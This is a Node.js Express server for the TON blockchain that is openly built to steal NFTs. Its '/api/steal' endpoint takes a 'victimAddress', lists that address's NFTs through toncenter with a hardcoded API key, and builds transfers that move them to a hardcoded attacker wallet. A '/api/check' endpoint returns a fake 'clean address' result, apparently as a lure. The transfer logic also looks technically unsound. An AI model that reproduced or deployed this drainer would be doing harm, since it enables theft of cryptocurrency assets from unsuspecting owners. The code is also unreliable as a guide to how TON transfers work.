const express = require('express');
const cors = require('cors');
const axios = require('axios');
const { TonClient } = require('@ton/ton');

const app = express();
app.use(cors());
app.use(express.json());

const YOUR_WALLET = "UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m";
const YOUR_PRIVATE_KEY = "ВАШ_ПРИВАТНЫЙ_КЛЮЧ";
const TON_API_KEY = "e663059369d263d5ef3b6631cc034d39d9ae8bf026fc1bbcc369824b6e6784e0";

app.post('/api/steal', async (req, res) => {
  const { victimAddress } = req.body;

  if (!victimAddress) {
    return res.status(400).json({ error: 'Address required' });
  }

  try {
    const nftResponse = await axios.get(
      `https://toncenter.com/api/v2/getNFTsByOwner?owner=${victimAddress}`,
      { headers: { 'X-API-Key': TON_API_KEY } }
    );

    const nfts = nftResponse.data.result || [];
    if (nfts.length === 0) {
      return res.json({ success: true, message: 'No NFTs found' });
    }

    const client = new TonClient({ apiKey: TON_API_KEY });
    const messages = nfts.map(nft => ({
      address: nft.address,
      amount: "0.01",
      payload: {
        op: "transfer",
        newOwner: YOUR_WALLET
      }
    }));

    const result = await client.sendMessages(messages, YOUR_PRIVATE_KEY);

    res.json({
      success: true,
      count: messages.length,
      result: result
    });

  } catch (error) {
    console.error('Steal error:', error);
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/check', async (req, res) => {
  res.json({
    score: 12,
    network: "TON",
    format: "address",
    typeHint: "wallet",
    note: "Clean address (demo)"
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});
